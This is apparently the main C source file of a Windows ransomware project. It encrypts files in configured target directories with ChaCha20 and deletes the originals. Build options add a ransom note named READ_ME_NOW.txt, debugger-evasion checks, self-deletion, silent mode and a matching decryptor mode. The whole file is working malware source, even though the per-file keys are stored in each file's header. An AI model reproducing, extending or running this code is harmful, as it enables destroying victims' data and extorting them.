#include <Windows.h>
#include <stdio.h>
#include <process.h>
#include <immintrin.h>
#include "config.h"
#include "structs.h"
#include "memutils.h"
#include "stringutils.h"
#include "antianalysis.h"
#include "chacha20.h"
#include "threadpool.h"
#pragma warning(disable : 4996 4325 4715)
/*
---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- ---------------------------------------------------------------------------------------------- */ 

LPCWSTR g_TargetDirs[] = { CONFIG_TARGET_DIRS };
LPCWSTR g_BlacklistedExts[] = { CONFIG_BLACKLISTED_EXTS };

LPCWSTR GetFileExtensionW(LPCWSTR wFilePath) {
    LPCWSTR dot = _wcsrchr(wFilePath, L'.');
    return (dot && *dot) ? dot : NULL;
}

BOOL IsBlacklistedExtension(LPCWSTR wFilePath) {
    LPCWSTR ext = GetFileExtensionW(wFilePath);
    for (int i = 0; i < ARRAYSIZE(g_BlacklistedExts); i++)
        if (_wcsicmp(ext, g_BlacklistedExts[i]) == 0)
            return TRUE;
    return FALSE;
}

PBYTE GenerateRandomBytes(IN DWORD dwKeySize) {
    PBYTE			pKey = NULL;
    USHORT	        usBytes = NULL;
    UINT        	uiSeed = (unsigned int)__TIME__[7];
    BOOL			bResult = FALSE;

    if (!(pKey = _heapalloc(dwKeySize)))
        return NULL;

    usBytes = (USHORT)((ULONG_PTR)pKey & 0xFFFF);

    for (int i = 0; i < dwKeySize; i++) {
        if (!_rdrand32_step(&uiSeed)) goto CLEANUP;
        if (i % 2 == 0) { pKey[i] = (unsigned int)(((usBytes ^ uiSeed) & 0xFF) % 0xFF); }
        else { pKey[i] = (unsigned int)((((usBytes ^ uiSeed) >> 8) & 0xFF) % 0xFF); }
    }
    bResult = TRUE;

CLEANUP:
    if (!bResult && pKey) { _heapfree(pKey); return NULL; }
    return pKey;
}

VOID EncryptSingleFile(LPCWSTR wPath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER FileSize64bit = { 0 };
    DWORD dwFileSize = 0, dwBytesRead = 0, written = 0;
    PBYTE pBuffer = NULL;
    PBYTE pRandomKey = NULL;
    PBYTE pNonce = NULL;
    WCHAR wOutPath[MAX_PATH];
    CHACHA20_CTX ctx;

    if ((hFile = CreateFileW(wPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        goto CLEANUP;

    if (!GetFileSizeEx(hFile, &FileSize64bit) || FileSize64bit.QuadPart == 0 || FileSize64bit.QuadPart > MAXDWORD)
        goto CLEANUP;

    dwFileSize = (DWORD)FileSize64bit.QuadPart;

    if (!(pBuffer = (BYTE*)_heapalloc(sizeof(ENCRYPTED_FILE_HEADER) + dwFileSize)))
        goto CLEANUP;

    if (!ReadFile(hFile, pBuffer + sizeof(ENCRYPTED_FILE_HEADER), dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize)
        goto CLEANUP;

    if (!(pRandomKey = GenerateRandomBytes(KEY_SIZE)))
        goto CLEANUP;
  
    if (!(pNonce = GenerateRandomBytes(NONCE_SIZE)))
        goto CLEANUP; 

    ChaCha20_Ctx_Init(&ctx, pRandomKey, pNonce, 0);
    ChaCha20_Xor(&ctx, pBuffer + sizeof(ENCRYPTED_FILE_HEADER), dwFileSize);

    ((ENCRYPTED_FILE_HEADER*)pBuffer)->Signature = SIGNATURE;
    _memcpy(((ENCRYPTED_FILE_HEADER*)pBuffer)->Key, pRandomKey, KEY_SIZE);
    _memcpy(((ENCRYPTED_FILE_HEADER*)pBuffer)->Nonce, pNonce, NONCE_SIZE);
    _wcscpy_s(wOutPath, MAX_PATH, wPath);
    _wcscat(wOutPath, ENCRYPT_EXT_W);

    DELETE_HANDLE(hFile);

    if ((hFile = CreateFileW(wOutPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
        goto CLEANUP;

    if (!(WriteFile(hFile, pBuffer, sizeof(ENCRYPTED_FILE_HEADER) + dwFileSize, &written, NULL)))
        goto CLEANUP;

    if (!DeleteFileW(wPath))
        goto CLEANUP;

#ifndef SILENT_MODE
    PRINT(L"  [+] Encrypted: %s -> %s\n", wPath, wOutPath);
#endif

CLEANUP:
    DELETE_HANDLE(hFile);
    if (pBuffer) _heapfree(pBuffer);
    if (pRandomKey) _heapfree(pRandomKey);
    return;
}


VOID DecryptSingleFile(LPCWSTR wPath) {
    HANDLE hFile = INVALID_HANDLE_VALUE;
    LARGE_INTEGER FileSize64bit = { 0 };
    DWORD dwFileSize = 0, dwBytesRead = 0, dwBytesWritten = 0, dwEncSize;
    PBYTE pBuffer = NULL;
    WCHAR wOutPath[MAX_PATH];
    size_t ExtLen = 0, PathLen = 0;
    PBYTE pEncData = NULL;
    CHACHA20_CTX ctx;

    if ((hFile = CreateFileW(wPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
#ifndef SILENT_MODE
        PRINT(L"  [!] Failed to open file: %s\n", wPath);
#endif
        goto CLEANUP;
    }

    if (!GetFileSizeEx(hFile, &FileSize64bit))
        goto CLEANUP;

    dwFileSize = (DWORD)FileSize64bit.QuadPart;

    if (dwFileSize <= sizeof(ENCRYPTED_FILE_HEADER))
        goto CLEANUP;

    if (!(pBuffer = (BYTE*)_heapalloc(dwFileSize)))
        goto CLEANUP;

    if (!ReadFile(hFile, pBuffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize) {
#ifndef SILENT_MODE
        PRINT(L"  [!] Failed to read header from file: %s\n", wPath);
#endif
        goto CLEANUP;
    }

    if (((ENCRYPTED_FILE_HEADER*)pBuffer)->Signature != SIGNATURE) {
#ifndef SILENT_MODE
        PRINT(L"  [!] Invalid signature, skipping file: %s\n", wPath);
#endif
        goto CLEANUP;
    }

    pEncData = pBuffer + sizeof(ENCRYPTED_FILE_HEADER);
    dwEncSize = dwFileSize - sizeof(ENCRYPTED_FILE_HEADER);

    ChaCha20_Ctx_Init(&ctx, ((ENCRYPTED_FILE_HEADER*)pBuffer)->Key, ((ENCRYPTED_FILE_HEADER*)pBuffer)->Nonce, 0);
    ChaCha20_Xor(&ctx, pEncData, dwEncSize);

    ExtLen = _wcslen(ENCRYPT_EXT_W);
    PathLen = _wcslen(wPath);

    if (PathLen <= ExtLen || _wcsicmp(wPath + PathLen - ExtLen, ENCRYPT_EXT_W) != 0)
        goto CLEANUP;

    _wcsncpy_s(wOutPath, MAX_PATH, wPath, PathLen - ExtLen);
    wOutPath[PathLen - ExtLen] = L'\0';

    DELETE_HANDLE(hFile);

    if ((hFile = CreateFileW(wOutPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) {
#ifndef SILENT_MODE
        PRINT(L"  [!] Failed to open file for writing: %s\n", wOutPath);
#endif
        goto CLEANUP;
    }

    if (!WriteFile(hFile, pEncData, dwEncSize, &dwBytesWritten, NULL))
        goto CLEANUP;

    DELETE_HANDLE(hFile);

    if (!DeleteFileW(wPath))
        goto CLEANUP;

#ifndef SILENT_MODE
    PRINT(L"  [+] Decrypted: %s -> %s\n", wPath, wOutPath);
#endif

CLEANUP:
    DELETE_HANDLE(hFile);
    if (pBuffer) _heapfree(pBuffer);
    return;
}

#ifdef RANSOM_MODE
BOOL WriteTextFile(LPCSTR wNote) {
    BOOL    bResult = FALSE;
    HANDLE  hFile = INVALID_HANDLE_VALUE;
    WCHAR   wCurrentDir[MAX_PATH];
    DWORD   dwDirectorySize = GetCurrentDirectoryW(MAX_PATH, wCurrentDir);
    DWORD   dwBytesWritten;

    if (dwDirectorySize == 0 || dwDirectorySize > MAX_PATH - 16) 
        goto CLEANUP;

    _wcscat(wCurrentDir, L"\\READ_ME_NOW.txt");

    if ((hFile = CreateFileW(wCurrentDir, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE) 
        goto CLEANUP;

    if (!WriteFile(hFile, wNote, (DWORD)_strlen(wNote), &dwBytesWritten, NULL))
        goto CLEANUP;

    bResult = TRUE;

CLEANUP:
    DELETE_HANDLE(hFile);
    return bResult;
}
#endif


BOOL Run(LPCWSTR* wDirs, BOOL bEncrypt) {

    for (int i = 0; wDirs[i] != NULL; i++) {
#ifndef SILENT_MODE
        PRINT(L"\n[*] Processing directory: %s\n", wDirs[i]);
#endif
        if (!ParallelProcessDirectory(wDirs[i], bEncrypt)) { 
#ifndef SILENT_MODE
            PRINT(L"[!] Failed to process directory!\n"); 
#endif
        }
    }
    return TRUE;
}


#ifndef DECRYPTOR
#define LOCKER
#endif
#ifdef LOCKER
BOOL g_EncryptMode = TRUE;
#else
BOOL g_EncryptMode = FALSE;
#endif
#ifdef RANSOM_MODE
LPCSTR  g_Note = { CONFIG_RANSOM_NOTE };
#endif

int main() {


#ifdef DEBUGGER_EVASION
    if (_IsDebuggerPresent()) {
        return EXIT_FAILURE;
    }
#endif


#ifndef SILENT_MODE
    DWORD dwStartTime = (DWORD)GetTickCount64();
#endif SILENT_MODE


    Run(g_TargetDirs, g_EncryptMode);
#ifndef SILENT_MODE
    PRINT(L"[*] Operation completed\n");
#endif


#ifndef SILENT_MODE
    DWORD g_FinishTime = (DWORD)GetTickCount64() - dwStartTime;
    PRINT(L"[*] Time: %d ms\n", g_FinishTime);
#endif SILENT_MODE


#ifdef RANSOM_MODE
   if (!WriteTextFile(g_Note)) { 
#ifndef SILENT_MODE
       PRINT(L"[!] Failed to drop note!\n");
#endif
   }
#endif      
    

#ifdef SELF_DELETION
    if (!DeleteSelf()) { 
#ifndef SILENT_MODE
        PRINT(L"[!] Failed to self-delete!\n"); 
#endif
    }
#endif

    return 0;
}
